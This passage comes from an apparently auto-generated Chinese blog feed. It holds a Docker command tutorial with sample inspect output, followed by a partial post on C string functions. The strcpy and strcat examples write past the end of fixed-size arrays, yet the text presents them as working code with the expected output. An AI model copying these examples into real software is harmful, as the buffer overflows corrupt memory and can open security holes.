杀手</td></tr><tr><td><code>--oom-score-adj</code></td><td></td><td>调整主机的 OOM 首选项（-1000 到 1000）</td></tr><tr><td><code>--pid</code></td><td></td><td>要使用的 PID 命名空间</td></tr><tr><td><code>--pids-limit</code></td><td></td><td>调整容器 pids 限制（设置 -1 表示无限制）</td></tr><tr><td><code>--platform</code></td><td></td><td><a href="https://docs.docker.com/engine/api/v1.32/"><strong>API 1.32+</strong></a> 如果服务器支持多平台，则设置平台</td></tr><tr><td><code>--privileged</code></td><td></td><td>授予此容器扩展权限</td></tr><tr><td><code>--publish</code>,<code>-p</code></td><td></td><td>将容器的端口发布到主机</td></tr><tr><td><code>--publish-all</code>,<code>-P</code></td><td></td><td>将所有暴露的端口发布到随机端口</td></tr><tr><td><code>--pull</code></td><td><code>missing</code></td><td>运行前拉取图像（“always”|“missing”|“never”）</td></tr><tr><td><code>--read-only</code></td><td></td><td>将容器的根文件系统挂载为只读</td></tr><tr><td><code>--restart</code></td><td><code>no</code></td><td>容器退出时应用的重启策略</td></tr><tr><td><code>--rm</code></td><td></td><td>容器退出时自动移除</td></tr><tr><td><code>--runtime</code></td><td></td><td>用于此容器的运行时</td></tr><tr><td><code>--security-opt</code></td><td></td><td>安全选项</td></tr><tr><td><code>--shm-size</code></td><td></td><td>/dev/shm 的大小</td></tr><tr><td><code>--sig-proxy</code></td><td><code>true</code></td><td>代理接收到的信号给进程</td></tr><tr><td><code>--stop-signal</code></td><td><code>SIGTERM</code></td><td>停止容器的信号</td></tr><tr><td><code>--stop-timeout</code></td><td></td><td><a href="https://docs.docker.com/engine/api/v1.25/"><strong>API 1.25+</strong></a> 停止容器的超时（以秒为单位）</td></tr><tr><td><code>--storage-opt</code></td><td></td><td>容器的存储驱动程序选项</td></tr><tr><td><code>--sysctl</code></td><td></td><td>Sysctl 选项</td></tr><tr><td><code>--tmpfs</code></td><td></td><td>挂载 tmpfs 目录</td></tr><tr><td><code>--tty</code>,<code>-t</code></td><td></td><td>分配一个伪 TTY</td></tr><tr><td><code>--ulimit</code></td><td></td><td>限制选项</td></tr><tr><td><code>--user</code>,<code>-u</code></td><td></td><td>用户名或 UID（格式：&lt;name|uid&gt;[:&lt;group|gid&gt;]）</td></tr><tr><td><code>--userns</code></td><td></td><td>要使用的用户命名空间</td></tr><tr><td><code>--uts</code></td><td></td><td>要使用的 UTS 命名空间</td></tr><tr><td><code>--volume</code>,<code>-v</code></td><td></td><td>绑定挂载卷</td></tr><tr><td><code>--volume-driver</code></td><td></td><td>容器的可选卷驱动程序</td></tr><tr><td><code>--volumes-from</code></td><td></td><td>从指定容器挂载卷</td></tr><tr><td><code>--workdir</code>,<code>-w</code></td><td></td><td>容器内的工作目录</td></tr></tbody></table><h4 id="docker-ps-命令">docker ps 命令</h4><blockquote><p>列出当前正在运行的容器</p></blockquote><p>-a #列出当前正在运行的容器+带出历史运行过的容器</p><p>-n=? 显示最近创建的容器</p><p>-q 只显示容器ID</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220508000049428.png" alt=""></p><h4 id="docker-rm-命令">docker rm 命令</h4><blockquote><p>docker rm 容器id 删除指定的容器</p><p>docker rm -f $(docker ps -aq) 删除所有的容器</p></blockquote><p>注意：运行的容器是不能删除的</p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220508000209625.png" alt=""></p><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220508000303111.png" alt=""></p><h4 id="docker-start">docker start</h4><blockquote><p>运行容器命令 docker start 容器id</p></blockquote><h4 id="docker-stop">docker stop</h4><blockquote><p>停止运行容器命令 docker stop 容器id</p></blockquote><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220508000641961.png" alt=""></p><h3 id="其他命令">其他命令</h3><h4 id="后台启动命令">后台启动命令</h4><p>docker run -d 镜像名</p><blockquote><p>docker run -d centos</p></blockquote><p>问题：docker ps,发现centos 停止了</p><p>常见的坑，docker 容器使用后台运行，就必须要有一个前台进程，docker发现没有应用，就会自动停止</p><p>ngnix，容器启动后，发现自己没有提供服务，就会立刻停止，就是没有程序了</p><h4 id="查看日志命令">查看日志命令</h4><blockquote><p>docker logs -tf  - - tail 容器，没有日志</p></blockquote><p>所以自己编写一个shell脚本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">while true;do echo thestar;sleep 1;done</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d centos /bin/sh -c &quot;while true;do echo thestar;sleep 1;done&quot;</span><br></pre></td></tr></table></figure><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220508003205029.png" alt=""></p><h4 id="查看容器进程信息命令">查看容器进程信息命令</h4><blockquote><p>docker top 容器id</p></blockquote><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220508003412944.png" alt=""></p><h4 id="查看镜像元数据">查看镜像元数据</h4><blockquote><p>docker inspect 容器id</p></blockquote><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220508003619916.png" alt=""></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-9-centos ~]# docker inspect 5fd1fbbd64f5</span><br><span class="line">[</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;Id&quot;: &quot;5fd1fbbd64f532e3322727bed6448d80aa41318dc1a9a0e66e0bedd1d7e466b7&quot;,</span><br><span class="line">        &quot;Created&quot;: &quot;2022-05-07T16:28:03.244511507Z&quot;,</span><br><span class="line">        &quot;Path&quot;: &quot;/bin/sh&quot;,</span><br><span class="line">        &quot;Args&quot;: [</span><br><span class="line">            &quot;-c&quot;,</span><br><span class="line">            &quot;while true;do echo thestar;sleep 1;done&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;State&quot;: &#123;</span><br><span class="line">            &quot;Status&quot;: &quot;running&quot;,</span><br><span class="line">            &quot;Running&quot;: true,</span><br><span class="line">            &quot;Paused&quot;: false,</span><br><span class="line">            &quot;Restarting&quot;: false,</span><br><span class="line">            &quot;OOMKilled&quot;: false,</span><br><span class="line">            &quot;Dead&quot;: false,</span><br><span class="line">            &quot;Pid&quot;: 5364,</span><br><span class="line">            &quot;ExitCode&quot;: 0,</span><br><span class="line">            &quot;Error&quot;: &quot;&quot;,</span><br><span class="line">            &quot;StartedAt&quot;: &quot;2022-05-07T16:28:03.580380166Z&quot;,</span><br><span class="line">            &quot;FinishedAt&quot;: &quot;0001-01-01T00:00:00Z&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;Image&quot;: &quot;sha256:5d0da3dc976460b72c77d94c8a1ad043720b0416bfc16c52c45d4847e53fadb6&quot;,</span><br><span class="line">        &quot;ResolvConfPath&quot;: &quot;/www/server/docker/containers/5fd1fbbd64f532e3322727bed6448d80aa41318dc1a9a0e66e0bedd1d7e466b7/resolv.conf&quot;,</span><br><span class="line">        &quot;HostnamePath&quot;: &quot;/www/server/docker/containers/5fd1fbbd64f532e3322727bed6448d80aa41318dc1a9a0e66e0bedd1d7e466b7/hostname&quot;,</span><br><span class="line">        &quot;HostsPath&quot;: &quot;/www/server/docker/containers/5fd1fbbd64f532e3322727bed6448d80aa41318dc1a9a0e66e0bedd1d7e466b7/hosts&quot;,</span><br><span class="line">        &quot;LogPath&quot;: &quot;/www/server/docker/containers/5fd1fbbd64f532e3322727bed6448d80aa41318dc1a9a0e66e0bedd1d7e466b7/5fd1fbbd64f532e3322727bed6448d80aa41318dc1a9a0e66e0bedd1d7e466b7-json.log&quot;,</span><br><span class="line">        &quot;Name&quot;: &quot;/crazy_ptolemy&quot;,</span><br><span class="line">        &quot;RestartCount&quot;: 0,</span><br><span class="line">        &quot;Driver&quot;: &quot;overlay2&quot;,</span><br><span class="line">        &quot;Platform&quot;: &quot;linux&quot;,</span><br><span class="line">        &quot;MountLabel&quot;: &quot;&quot;,</span><br><span class="line">        &quot;ProcessLabel&quot;: &quot;&quot;,</span><br><span class="line">        &quot;AppArmorProfile&quot;: &quot;&quot;,</span><br><span class="line">        &quot;ExecIDs&quot;: null,</span><br><span class="line">        &quot;HostConfig&quot;: &#123;</span><br><span class="line">            &quot;Binds&quot;: null,</span><br><span class="line">            &quot;ContainerIDFile&quot;: &quot;&quot;,</span><br><span class="line">            &quot;LogConfig&quot;: &#123;</span><br><span class="line">                &quot;Type&quot;: &quot;json-file&quot;,</span><br><span class="line">                &quot;Config&quot;: &#123;&#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;NetworkMode&quot;: &quot;default&quot;,</span><br><span class="line">            &quot;PortBindings&quot;: &#123;&#125;,</span><br><span class="line">            &quot;RestartPolicy&quot;: &#123;</span><br><span class="line">                &quot;Name&quot;: &quot;no&quot;,</span><br><span class="line">                &quot;MaximumRetryCount&quot;: 0</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;AutoRemove&quot;: false,</span><br><span class="line">            &quot;VolumeDriver&quot;: &quot;&quot;,</span><br><span class="line">            &quot;VolumesFrom&quot;: null,</span><br><span class="line">            &quot;CapAdd&quot;: null,</span><br><span class="line">            &quot;CapDrop&quot;: null,</span><br><span class="line">            &quot;CgroupnsMode&quot;: &quot;host&quot;,</span><br><span class="line">            &quot;Dns&quot;: [],</span><br><span class="line">            &quot;DnsOptions&quot;: [],</span><br><span class="line">            &quot;DnsSearch&quot;: [],</span><br><span class="line">            &quot;ExtraHosts&quot;: null,</span><br><span class="line">            &quot;GroupAdd&quot;: null,</span><br><span class="line">            &quot;IpcMode&quot;: &quot;private&quot;,</span><br><span class="line">            &quot;Cgroup&quot;: &quot;&quot;,</span><br><span class="line">            &quot;Links&quot;: null,</span><br><span class="line">            &quot;OomScoreAdj&quot;: 0,</span><br><span class="line">            &quot;PidMode&quot;: &quot;&quot;,</span><br><span class="line">            &quot;Privileged&quot;: false,</span><br><span class="line">            &quot;PublishAllPorts&quot;: false,</span><br><span class="line">            &quot;ReadonlyRootfs&quot;: false,</span><br><span class="line">            &quot;SecurityOpt&quot;: null,</span><br><span class="line">            &quot;UTSMode&quot;: &quot;&quot;,</span><br><span class="line">            &quot;UsernsMode&quot;: &quot;&quot;,</span><br><span class="line">            &quot;ShmSize&quot;: 67108864,</span><br><span class="line">            &quot;Runtime&quot;: &quot;runc&quot;,</span><br><span class="line">            &quot;ConsoleSize&quot;: [</span><br><span class="line">                0,</span><br><span class="line">                0</span><br><span class="line">            ],</span><br><span class="line">            &quot;Isolation&quot;: &quot;&quot;,</span><br><span class="line">            &quot;CpuShares&quot;: 0,</span><br><span class="line">            &quot;Memory&quot;: 0,</span><br><span class="line">            &quot;NanoCpus&quot;: 0,</span><br><span class="line">            &quot;CgroupParent&quot;: &quot;&quot;,</span><br><span class="line">            &quot;BlkioWeight&quot;: 0,</span><br><span class="line">            &quot;BlkioWeightDevice&quot;: [],</span><br><span class="line">            &quot;BlkioDeviceReadBps&quot;: null,</span><br><span class="line">            &quot;BlkioDeviceWriteBps&quot;: null,</span><br><span class="line">            &quot;BlkioDeviceReadIOps&quot;: null,</span><br><span class="line">            &quot;BlkioDeviceWriteIOps&quot;: null,</span><br><span class="line">            &quot;CpuPeriod&quot;: 0,</span><br><span class="line">            &quot;CpuQuota&quot;: 0,</span><br><span class="line">            &quot;CpuRealtimePeriod&quot;: 0,</span><br><span class="line">            &quot;CpuRealtimeRuntime&quot;: 0,</span><br><span class="line">            &quot;CpusetCpus&quot;: &quot;&quot;,</span><br><span class="line">            &quot;CpusetMems&quot;: &quot;&quot;,</span><br><span class="line">            &quot;Devices&quot;: [],</span><br><span class="line">            &quot;DeviceCgroupRules&quot;: null,</span><br><span class="line">            &quot;DeviceRequests&quot;: null,</span><br><span class="line">            &quot;KernelMemory&quot;: 0,</span><br><span class="line">            &quot;KernelMemoryTCP&quot;: 0,</span><br><span class="line">            &quot;MemoryReservation&quot;: 0,</span><br><span class="line">            &quot;MemorySwap&quot;: 0,</span><br><span class="line">            &quot;MemorySwappiness&quot;: null,</span><br><span class="line">            &quot;OomKillDisable&quot;: false,</span><br><span class="line">            &quot;PidsLimit&quot;: null,</span><br><span class="line">            &quot;Ulimits&quot;: null,</span><br><span class="line">            &quot;CpuCount&quot;: 0,</span><br><span class="line">            &quot;CpuPercent&quot;: 0,</span><br><span class="line">            &quot;IOMaximumIOps&quot;: 0,</span><br><span class="line">            &quot;IOMaximumBandwidth&quot;: 0,</span><br><span class="line">            &quot;MaskedPaths&quot;: [</span><br><span class="line">                &quot;/proc/asound&quot;,</span><br><span class="line">                &quot;/proc/acpi&quot;,</span><br><span class="line">                &quot;/proc/kcore&quot;,</span><br><span class="line">                &quot;/proc/keys&quot;,</span><br><span class="line">                &quot;/proc/latency_stats&quot;,</span><br><span class="line">                &quot;/proc/timer_list&quot;,</span><br><span class="line">                &quot;/proc/timer_stats&quot;,</span><br><span class="line">                &quot;/proc/sched_debug&quot;,</span><br><span class="line">                &quot;/proc/scsi&quot;,</span><br><span class="line">                &quot;/sys/firmware&quot;</span><br><span class="line">            ],</span><br><span class="line">            &quot;ReadonlyPaths&quot;: [</span><br><span class="line">                &quot;/proc/bus&quot;,</span><br><span class="line">                &quot;/proc/fs&quot;,</span><br><span class="line">                &quot;/proc/irq&quot;,</span><br><span class="line">                &quot;/proc/sys&quot;,</span><br><span class="line">                &quot;/proc/sysrq-trigger&quot;</span><br><span class="line">            ]</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;GraphDriver&quot;: &#123;</span><br><span class="line">            &quot;Data&quot;: &#123;</span><br><span class="line">                &quot;LowerDir&quot;: &quot;/www/server/docker/overlay2/e8d09701e1e0c50d31c51060cf7826192db5b03e3abac06b37028baf0a68f3f8-init/diff:/www/server/docker/overlay2/855ed5845262e74e153f25a24f8bc833f9537af9e7b2b2dbd7305385a0fcdc91/diff&quot;,</span><br><span class="line">                &quot;MergedDir&quot;: &quot;/www/server/docker/overlay2/e8d09701e1e0c50d31c51060cf7826192db5b03e3abac06b37028baf0a68f3f8/merged&quot;,</span><br><span class="line">                &quot;UpperDir&quot;: &quot;/www/server/docker/overlay2/e8d09701e1e0c50d31c51060cf7826192db5b03e3abac06b37028baf0a68f3f8/diff&quot;,</span><br><span class="line">                &quot;WorkDir&quot;: &quot;/www/server/docker/overlay2/e8d09701e1e0c50d31c51060cf7826192db5b03e3abac06b37028baf0a68f3f8/work&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;Name&quot;: &quot;overlay2&quot;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;Mounts&quot;: [],</span><br><span class="line">        &quot;Config&quot;: &#123;</span><br><span class="line">            &quot;Hostname&quot;: &quot;5fd1fbbd64f5&quot;,</span><br><span class="line">            &quot;Domainname&quot;: &quot;&quot;,</span><br><span class="line">            &quot;User&quot;: &quot;&quot;,</span><br><span class="line">            &quot;AttachStdin&quot;: false,</span><br><span class="line">            &quot;AttachStdout&quot;: false,</span><br><span class="line">            &quot;AttachStderr&quot;: false,</span><br><span class="line">            &quot;Tty&quot;: false,</span><br><span class="line">            &quot;OpenStdin&quot;: false,</span><br><span class="line">            &quot;StdinOnce&quot;: false,</span><br><span class="line">            &quot;Env&quot;: [</span><br><span class="line">                &quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span><br><span class="line">            ],</span><br><span class="line">            &quot;Cmd&quot;: [</span><br><span class="line">                &quot;/bin/sh&quot;,</span><br><span class="line">                &quot;-c&quot;,</span><br><span class="line">                &quot;while true;do echo thestar;sleep 1;done&quot;</span><br><span class="line">            ],</span><br><span class="line">            &quot;Image&quot;: &quot;centos&quot;,</span><br><span class="line">            &quot;Volumes&quot;: null,</span><br><span class="line">            &quot;WorkingDir&quot;: &quot;&quot;,</span><br><span class="line">            &quot;Entrypoint&quot;: null,</span><br><span class="line">            &quot;OnBuild&quot;: null,</span><br><span class="line">            &quot;Labels&quot;: &#123;</span><br><span class="line">                &quot;org.label-schema.build-date&quot;: &quot;20210915&quot;,</span><br><span class="line">                &quot;org.label-schema.license&quot;: &quot;GPLv2&quot;,</span><br><span class="line">                &quot;org.label-schema.name&quot;: &quot;CentOS Base Image&quot;,</span><br><span class="line">                &quot;org.label-schema.schema-version&quot;: &quot;1.0&quot;,</span><br><span class="line">                &quot;org.label-schema.vendor&quot;: &quot;CentOS&quot;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &quot;NetworkSettings&quot;: &#123;</span><br><span class="line">            &quot;Bridge&quot;: &quot;&quot;,</span><br><span class="line">            &quot;SandboxID&quot;: &quot;4d16a6f2a47755b8d4ccd3c3132a9103ec9def338097db88a0e624785d0694fa&quot;,</span><br><span class="line">            &quot;HairpinMode&quot;: false,</span><br><span class="line">            &quot;LinkLocalIPv6Address&quot;: &quot;&quot;,</span><br><span class="line">            &quot;LinkLocalIPv6PrefixLen&quot;: 0,</span><br><span class="line">            &quot;Ports&quot;: &#123;&#125;,</span><br><span class="line">            &quot;SandboxKey&quot;: &quot;/var/run/docker/netns/4d16a6f2a477&quot;,</span><br><span class="line">            &quot;SecondaryIPAddresses&quot;: null,</span><br><span class="line">            &quot;SecondaryIPv6Addresses&quot;: null,</span><br><span class="line">            &quot;EndpointID&quot;: &quot;8fe4d352bc51bc8caa694a442755ce566e4efc3cb3c169d8ae7d95880331d8f9&quot;,</span><br><span class="line">            &quot;Gateway&quot;: &quot;172.17.0.1&quot;,</span><br><span class="line">            &quot;GlobalIPv6Address&quot;: &quot;&quot;,</span><br><span class="line">            &quot;GlobalIPv6PrefixLen&quot;: 0,</span><br><span class="line">            &quot;IPAddress&quot;: &quot;172.17.0.4&quot;,</span><br><span class="line">            &quot;IPPrefixLen&quot;: 16,</span><br><span class="line">            &quot;IPv6Gateway&quot;: &quot;&quot;,</span><br><span class="line">            &quot;MacAddress&quot;: &quot;02:42:ac:11:00:04&quot;,</span><br><span class="line">            &quot;Networks&quot;: &#123;</span><br><span class="line">                &quot;bridge&quot;: &#123;</span><br><span class="line">                    &quot;IPAMConfig&quot;: null,</span><br><span class="line">                    &quot;Links&quot;: null,</span><br><span class="line">                    &quot;Aliases&quot;: null,</span><br><span class="line">                    &quot;NetworkID&quot;: &quot;bc47d1b592b1910409e378139980b0adb0b7e125d3eb168ac402ad65fee686e4&quot;,</span><br><span class="line">                    &quot;EndpointID&quot;: &quot;8fe4d352bc51bc8caa694a442755ce566e4efc3cb3c169d8ae7d95880331d8f9&quot;,</span><br><span class="line">                    &quot;Gateway&quot;: &quot;172.17.0.1&quot;,</span><br><span class="line">                    &quot;IPAddress&quot;: &quot;172.17.0.4&quot;,</span><br><span class="line">                    &quot;IPPrefixLen&quot;: 16,</span><br><span class="line">                    &quot;IPv6Gateway&quot;: &quot;&quot;,</span><br><span class="line">                    &quot;GlobalIPv6Address&quot;: &quot;&quot;,</span><br><span class="line">                    &quot;GlobalIPv6PrefixLen&quot;: 0,</span><br><span class="line">                    &quot;MacAddress&quot;: &quot;02:42:ac:11:00:04&quot;,</span><br><span class="line">                    &quot;DriverOpts&quot;: null</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">]</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="进入当前正在运行的容器">进入当前正在运行的容器</h4><blockquote><p>我们通常容器都是使用后台方式运行的，需要进入容器，修改一些配置</p><p>命令</p><p>docker exec -it 容器id bashshell</p></blockquote><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220508004259734.png" alt=""></p><blockquote><p>docker attach 容器id</p></blockquote><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220508004833571.png" alt=""></p><p>区别：</p><p>docker exec #进入容器后开启一个新的终端，可以在里面操作（常用）</p><p>docker attach #进入容器正在执行的终端，不会启动新的进程</p><h4 id="从容器内拷贝文件到主机">从容器内拷贝文件到主机</h4><blockquote><p>docker cp 容器id:容器内路径 目的的主机路径</p></blockquote><p><img src="https://thestar0-1308426403.cos.ap-chengdu.myqcloud.com/img/image-20220508005743446.png" alt=""></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-9-centos home]# docker attach 2100b9a9e97f</span><br><span class="line">[root@2100b9a9e97f /]# ls</span><br><span class="line">bin  dev  etc  home  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</span><br><span class="line">[root@2100b9a9e97f /]# cd /home</span><br><span class="line">[root@2100b9a9e97f home]# touch test.java</span><br><span class="line">[root@2100b9a9e97f home]# ls</span><br><span class="line">test.java</span><br><span class="line">[root@2100b9a9e97f home]# exit </span><br><span class="line">exit</span><br><span class="line">[root@VM-16-9-centos home]# docker cp 2100b9a9e97f:/home/test.java /home</span><br><span class="line">[root@VM-16-9-centos home]# cd /home</span><br><span class="line">[root@VM-16-9-centos home]# ls</span><br><span class="line">lighthouse  test.java  thestar.java  www</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言字符串处理函数</title>
      <link href="//8461793b.html"/>
      <url>//8461793b.html</url>
      
        <content type="html"><![CDATA[<h1>c语言字符串处理函数</h1><h2 id="strcpy-；函数"><em>strcpy()；函数</em></h2><p>结构：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strcpy(str1,str2);//两个参数str1,str2，本质就是将str2赋值给str1</span><br></pre></td></tr></table></figure><p>功能：</p><p>复制字符串 str2 到字符串 str1。（返回的是字符串数组，用%s接收）</p><p>自己理解的意思就是，将后面那个字符串赋给前面那个字符串,相当于编程语言里面的=（赋值号）</p><p>上代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str1[] = <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> str2[] = <span class="string">&quot;thestar0yyds&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, <span class="built_in">strcpy</span>(str1, str2));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>代码输出的就是后面那个字符串thestar0yyds</p></blockquote><h2 id="strcat-；函数"><em>strcat()；函数</em></h2><p>结构：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strcat（str1,str2);//同样两个参数，两个以上的参数我试了一下，会报错，看样子连续多个字符串拼接不现实</span><br></pre></td></tr></table></figure><p>功能：</p><p>字符串拼接，就是两个字符串连接起来，按照先后顺序排列连接，连接字符串 str2 到字符串 str1 的末尾。（返回的是字符串数组，注意用%s接收）</p><p>上代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> str1[] = <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">    <span class="keyword">char</span> str2[] = <span class="string">&quot;thestar0yyds&quot;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, <span class="built_in">strcat</span>(str1, str2));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>代码输出的就是hello worldthestar0yyds</p></blockquote><h2 id="strlen-函数"><em>strlen();函数</em></h2><p>结构：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 